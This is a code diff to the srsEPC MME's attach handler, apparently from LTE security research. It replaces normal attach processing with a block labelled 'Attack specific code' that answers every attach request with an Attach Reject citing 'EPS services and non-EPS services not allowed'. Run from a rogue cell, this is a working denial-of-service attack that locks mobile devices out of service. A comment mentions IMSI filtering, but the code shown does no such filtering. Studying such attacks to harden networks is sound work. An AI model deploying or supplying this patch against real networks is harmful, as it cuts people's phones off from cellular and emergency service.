diff --git a/srsepc/src/mme/nas.cc b/srsepc/src/mme/nas.cc
index 6c8206398..22748e853 100644
--- a/srsepc/src/mme/nas.cc
+++ b/srsepc/src/mme/nas.cc
@@ -176,28 +176,101 @@ bool nas::handle_attach_request(uint32_t                enb_ue_s1ap_id,
 
   // Get NAS Context if UE is known
   nas* nas_ctx = s1ap->find_nas_ctx_from_imsi(imsi);
-  if (nas_ctx == NULL) {
-    // Get attach type from attach request
-    if (attach_req.eps_mobile_id.type_of_id == LIBLTE_MME_EPS_MOBILE_ID_TYPE_IMSI) {
-      nas::handle_imsi_attach_request_unknown_ue(enb_ue_s1ap_id, enb_sri, attach_req, pdn_con_req, args, itf);
-    } else if (attach_req.eps_mobile_id.type_of_id == LIBLTE_MME_EPS_MOBILE_ID_TYPE_GUTI) {
-      nas::handle_guti_attach_request_unknown_ue(enb_ue_s1ap_id, enb_sri, attach_req, pdn_con_req, args, itf);
-    } else {
-      return false;
-    }
-  } else {
-    nas_logger.info("Attach Request -- Found previously attached UE.");
-    srsran::console("Attach Request -- Found previously attach UE.\n");
-    if (attach_req.eps_mobile_id.type_of_id == LIBLTE_MME_EPS_MOBILE_ID_TYPE_IMSI) {
-      nas::handle_imsi_attach_request_known_ue(
-          nas_ctx, enb_ue_s1ap_id, enb_sri, attach_req, pdn_con_req, nas_rx, args, itf);
-    } else if (attach_req.eps_mobile_id.type_of_id == LIBLTE_MME_EPS_MOBILE_ID_TYPE_GUTI) {
-      nas::handle_guti_attach_request_known_ue(
-          nas_ctx, enb_ue_s1ap_id, enb_sri, attach_req, pdn_con_req, nas_rx, args, itf);
-    } else {
-      return false;
+
+  if (nas_ctx != nullptr) {
+    // Delete previous GTP-U session
+    gtpc->send_delete_session_request(nas_ctx->m_emm_ctx.imsi);
+
+    // Release previous context in the eNB, if present
+    if (nas_ctx->m_ecm_ctx.mme_ue_s1ap_id != 0) {
+      s1ap->send_ue_context_release_command(nas_ctx->m_ecm_ctx.mme_ue_s1ap_id);
     }
+    // Delete previous NAS context
+    s1ap->delete_ue_ctx(nas_ctx->m_emm_ctx.imsi);
+  }
+
+  // Create UE context
+  nas_ctx = new nas(args, itf);
+
+  // Save IMSI, eNB UE S1AP Id, MME UE S1AP Id and make sure UE is EMM_DEREGISTERED
+  nas_ctx->m_emm_ctx.imsi           = imsi;
+  nas_ctx->m_emm_ctx.state          = EMM_STATE_DEREGISTERED;
+  nas_ctx->m_ecm_ctx.enb_ue_s1ap_id = enb_ue_s1ap_id;
+  nas_ctx->m_ecm_ctx.mme_ue_s1ap_id = s1ap->get_next_mme_ue_s1ap_id();
+
+  // Save UE network capabilities
+  memcpy(
+      &nas_ctx->m_sec_ctx.ue_network_cap, &attach_req.ue_network_cap, sizeof(LIBLTE_MME_UE_NETWORK_CAPABILITY_STRUCT));
+  nas_ctx->m_sec_ctx.ms_network_cap_present = attach_req.ms_network_cap_present;
+  if (attach_req.ms_network_cap_present) {
+    memcpy(&nas_ctx->m_sec_ctx.ms_network_cap,
+           &attach_req.ms_network_cap,
+           sizeof(LIBLTE_MME_MS_NETWORK_CAPABILITY_STRUCT));
+  }
+
+  uint8_t eps_bearer_id                       = pdn_con_req.eps_bearer_id; // TODO: Unused
+  nas_ctx->m_emm_ctx.procedure_transaction_id = pdn_con_req.proc_transaction_id;
+
+  // Initialize NAS count
+  nas_ctx->m_sec_ctx.ul_nas_count = 0;
+  nas_ctx->m_sec_ctx.dl_nas_count = 0;
+
+  // Set eNB information
+  memcpy(&nas_ctx->m_ecm_ctx.enb_sri, enb_sri, sizeof(struct sctp_sndrcvinfo));
+
+  // Save whether secure ESM information transfer is necessary
+  nas_ctx->m_ecm_ctx.eit = pdn_con_req.esm_info_transfer_flag_present;
+
+  // Initialize E-RABs
+  for (uint i = 0; i < MAX_ERABS_PER_UE; i++) {
+    nas_ctx->m_esm_ctx[i].state   = ERAB_DEACTIVATED;
+    nas_ctx->m_esm_ctx[i].erab_id = i;
   }
+
+  // Save attach request type
+  nas_ctx->m_emm_ctx.attach_type = attach_req.eps_attach_type;
+
+  // Allocate eKSI for this authentication vector
+  // Here we assume a new security context thus a new eKSI
+  nas_ctx->m_sec_ctx.eksi = 0;
+
+  // Save the UE context
+  s1ap->add_nas_ctx_to_imsi_map(nas_ctx);
+  s1ap->add_nas_ctx_to_mme_ue_s1ap_id_map(nas_ctx);
+  s1ap->add_ue_to_enb_set(enb_sri->sinfo_assoc_id, nas_ctx->m_ecm_ctx.mme_ue_s1ap_id);
+
+  srsran::unique_byte_buffer_t nas_tx = srsran::make_byte_buffer();
+  if (nas_tx == nullptr) {
+    nas_logger.error("Couldn't allocate PDU in %s().", __FUNCTION__);
+    return false;
+  }
+
+  // ====================
+  // Attack specific code
+  // ====================
+
+  LIBLTE_MME_ATTACH_REJECT_MSG_STRUCT attach_reject = {};
+  attach_reject.t3446_value_present = false;
+  attach_reject.t3446_value = 0;
+  attach_reject.esm_msg_present = false;
+  // In an experiment, one would only reply this to the device under test (by IMSI filtering)
+  attach_reject.emm_cause = LIBLTE_MME_EMM_CAUSE_EPS_SERVICES_AND_NON_EPS_SERVICES_NOT_ALLOWED;
+
+  srsran::console("Sending attach reject: %d\n", attach_reject.emm_cause);
+  nas_logger.info("Sending attach reject: %d", attach_reject.emm_cause);
+
+  err = liblte_mme_pack_attach_reject_msg(&attach_reject, (LIBLTE_BYTE_MSG_STRUCT*)nas_tx.get());
+  if (err != LIBLTE_SUCCESS) {
+    nas_logger.error("Error packing NAS Attach Reject. Error: %s", liblte_error_text[err]);
+    return false;
+  }
+
+  s1ap->send_downlink_nas_transport(enb_ue_s1ap_id,
+                                    nas_ctx != NULL
+                                      ? nas_ctx->m_ecm_ctx.mme_ue_s1ap_id
+                                      : s1ap->get_next_mme_ue_s1ap_id(),
+                                    nas_tx.get(),
+                                    *enb_sri);
   return true;
 }
 
